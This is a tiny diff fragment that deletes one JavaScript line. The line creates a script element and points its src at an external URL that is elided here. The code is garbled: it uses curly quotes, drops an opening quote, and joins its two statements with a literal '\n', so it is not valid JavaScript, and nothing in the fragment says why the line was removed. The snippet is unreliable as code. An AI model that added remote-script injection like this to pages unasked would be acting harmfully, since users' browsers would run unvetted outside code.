@@ -1,1 +1,0 @@
-var script = document.createElement(“script”);\nscript.src = https://....”;
